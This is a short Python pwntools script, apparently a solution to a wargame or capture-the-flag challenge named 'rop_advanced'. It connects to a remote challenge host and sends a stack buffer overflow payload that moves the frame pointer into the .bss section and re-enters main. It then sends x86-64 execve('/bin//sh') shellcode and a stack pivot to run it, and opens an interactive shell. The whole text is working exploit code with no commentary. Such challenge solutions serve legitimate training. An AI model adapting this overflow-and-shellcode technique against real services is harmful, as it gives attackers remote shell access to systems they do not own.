from pwn import *
r=remote("subhack.xyz" ,1005)
#r=process("/GitHub/Writeup/Wargame/PwnPwn/pwn/rop_advance/rop_advanced")
context.log_level='debug'
shellcode=b'\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05'
bss=0x601040+0x100
e=ELF("/GitHub/Writeup/Wargame/PwnPwn/pwn/rop_advance/rop_advanced")
pause()
pay=b'x'*0x40
pay+=p64(bss)
pay+=p64(e.symbols['main']+28)
r.send(pay)

pay2=shellcode+p64(bss-0x40)
pay2+=b'\x90'*(0x40-len(pay2))
log.info(len(pay2))
pay2+=p64(bss-0x48)
pay2+=p64(bss-0x40)
r.send(pay2)
r.interactive()
